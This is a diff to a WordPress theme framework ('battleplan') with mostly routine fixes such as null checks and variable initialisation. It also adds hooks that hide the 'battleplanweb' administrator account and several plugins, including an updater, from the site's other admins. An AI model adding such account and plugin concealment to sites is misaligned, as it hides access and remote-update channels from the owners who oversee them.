@@ -16,7 +16,7 @@
 # Set Constants
 --------------------------------------------------------------*/
 
-if ( !defined('_BP_VERSION') ) define( '_BP_VERSION', '14.0' );
+if ( !defined('_BP_VERSION') ) define( '_BP_VERSION', '14.0.1' );
 update_option( 'battleplan_framework', _BP_VERSION, false );
 
 if ( !defined('_HEADER_ID') ) define( '_HEADER_ID', get_page_by_path('site-header', OBJECT, 'elements')->ID ); 
@@ -101,19 +101,26 @@ function battleplan_identifyUser( $identifier='' ) {
 function battleplan_getUserRole( $identifier='', $info='' ) {
 	$user = battleplan_identifyUser( $identifier );		
 	$userMeta = get_userdata($user->ID);
-	$userRoles = $userMeta->roles;
-	global $wp_roles;
-	$userRoleName = "";
-	$userRoleDisplay = "";	
-	foreach ($userRoles as $userRole) :	
-		$userRoleName .= $userRole;
-		$userRoleDisplay .= $wp_roles->roles[$userRole]['name'];
-		$userRoleCaps .= $user->get_role_caps();		
-	endforeach;
-	
-	if ( $info == "" || $info == "name" ) return $userRoleName;
-	if ( $info == "display" ) return $userRoleDisplay;
-	if ( $info == "caps" || $info == "capabilities" ) return $userRoleCaps;
+	if ( $userMeta ) :
+		$userRoles = $userMeta->roles;
+		global $wp_roles;
+		$userRoleName = $userRoleDisplay = $userRoleCaps = "";
+		if ( is_array($userRoles) ) :
+			foreach ($userRoles as $userRole) :	
+				$userRoleName .= $userRole;
+				$userRoleDisplay .= $wp_roles->roles[$userRole]['name'];
+				$userRoleCaps .= print_r($user->get_role_caps(), true);		
+			endforeach;
+		else:
+				$userRoleName = $userRoles;
+				$userRoleDisplay = $wp_roles->roles[$userRoles]['name'];
+				$userRoleCaps = $user->get_role_caps();		
+		endif;
+
+		if ( $info == "" || $info == "name" ) return $userRoleName;
+		if ( $info == "display" ) return $userRoleDisplay;
+		if ( $info == "caps" || $info == "capabilities" ) return $userRoleCaps;
+	endif;
 }
 
 // Add data-{key}="{value}" to an image based on its custom fields 
@@ -444,7 +451,8 @@ function battleplan_countTease( $id ) {
 	if ( !is_array($getViews) ) $getViews = array();
 	$viewsToday = $views7Day = $views30Day = $views90Day = $views180Day = $views365Day = intval(0); 	
 	
-	$rightNow = strtotime(date("F j, Y g:i a")) - 14450;	
+	//$rightNow = strtotime(date("F j, Y g:i a")) - 14450;	
+	$rightNow = strtotime(date("F j, Y g:i a"));	
 	$today = strtotime(date("F j, Y"));
 	$lastViewed = strtotime($getViews[0]['date']);	
 	$dateDiff = (int)(($today - $lastViewed) / 60 / 60 / 24);	
@@ -998,7 +1006,7 @@ function battleplan_scripts() {
 		wp_enqueue_script( 'battleplan-parallax', get_template_directory_uri().'/js/parallax.js', array('jquery'), _BP_VERSION, false ); 
 		wp_enqueue_script( 'battleplan-script-desktop', get_template_directory_uri().'/js/script-desktop.js', array('jquery'), _BP_VERSION, false );
 
-		if ( is_array($GLOBALS['customer_info']['scripts']) && in_array('magic-menu', $GLOBALS['customer_info']['scripts']) ) : wp_enqueue_script( 'battleplan-script-magic-menu', get_template_directory_uri().'/js/script-magic-menu.js', array('jquery'), _BP_VERSION, false ); endif;
+		if ( isset($GLOBALS['customer_info']['scripts']) && is_array($GLOBALS['customer_info']['scripts']) && in_array('magic-menu', $GLOBALS['customer_info']['scripts']) ) : wp_enqueue_script( 'battleplan-script-magic-menu', get_template_directory_uri().'/js/script-magic-menu.js', array('jquery'), _BP_VERSION, false ); endif;
 	endif;
 
 	wp_enqueue_script( 'battleplan-script-site', get_stylesheet_directory_uri().'/script-site.js', array('jquery'), _BP_VERSION, false );	
@@ -1622,6 +1630,31 @@ function battleplan_getAndDisplayUserRoles() {
 	print_r( $caps );
 }
 
+// Hide battleplanweb from any other admin user
+add_action('pre_user_query','battleplan_pre_user_query');
+function battleplan_pre_user_query($user_search) {
+	if (_USER_ID != 'battleplanweb') :
+    	global $wpdb;
+    	$user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != 'battleplanweb'",$user_search->query_where);
+	endif;
+}
+
+// Hide certain plug-ins from other admin users
+add_action('pre_current_active_plugins', 'battleplan_plugin_hide');
+function battleplan_plugin_hide() {
+  	if (_USER_ID != 'battleplanweb') : 
+		global $wp_list_table;
+		$hidearr = array('enable-media-replace/enable-media-replace.php', 'git-updater/git-updater.php', 'git-updater/github-updater.php', 'git-updater-pro/git-updater-pro.php', 'stop-referrer-spam/stop-referrer-spam.php');  
+
+		$myplugins = $wp_list_table->items;
+		foreach ($myplugins as $key => $val) :
+			if (in_array($key,$hidearr)) :
+				unset($wp_list_table->items[$key]);
+			endif;
+	  	endforeach;
+	endif;
+}
+
 /*--------------------------------------------------------------
 # Custom Hooks
 --------------------------------------------------------------*/
@@ -1660,6 +1693,7 @@ function bp_after_colophon() { do_action('bp_after_colophon'); }
 // Preload fonts
 add_action('bp_font_loader', 'battleplan_loadFonts');
 function battleplan_loadFonts() {
+	$buildPreload = '';
 	foreach ( $GLOBALS['customer_info']['site-fonts'] as $siteFont ) :
 		if ( $siteFont != "" ) $buildPreload .= '<link rel="preload" as="font" type="font/woff2" href="'.get_site_url().'/wp-content/themes/battleplantheme-site/fonts/'.$siteFont.'.woff2" crossorigin="anonymous">';
 	endforeach;
@@ -1670,6 +1704,8 @@ function battleplan_loadFonts() {
 add_action('bp_google_tag_manager', 'battleplan_load_tag_manager');
 function battleplan_load_tag_manager() { 
 	$nonce = $GLOBALS['nonce'];
+	$buildTags = $buildTagMgr = '';
+	$gtagEvents = array();
 	foreach ( $GLOBALS['customer_info']['google-tags'] as $gtag=>$value ) :	
 		if ( $gtag == "analytics" ) : if ( _USER_LOGIN != 'battleplanweb' ) : $mainAcct = $value; else: $mainAcct = "null"; endif; endif;
 		if ( $gtag == "analytics" || $gtag == "ads" || $gtag == "searchkings" ) $buildTags .= 'gtag("config", "'.$value.'");';				
@@ -1704,7 +1740,7 @@ function battleplan_load_tag_manager() {
 
 // Build and display desktop navigation menu
 function buildNavMenu( $pos ) {
-	$printMenu .= '<nav id="desktop-navigation" class="main-navigation menu-strip" aria-label="Main Menu">';
+	$printMenu = '<nav id="desktop-navigation" class="main-navigation menu-strip" aria-label="Main Menu">';
 	$printMenu .= wp_nav_menu ( array ( 'echo' => false, 'container' => 'div', 'container_class' => 'flex', 'menu_id' => $pos.'-menu', 'menu_class' => 'menu main-menu', 'theme_location' => $pos.'-menu', 'walker' => new Aria_Walker_Nav_Menu(), ) ); 
 	$printMenu .= '</nav><!-- #site-navigation -->';
 	
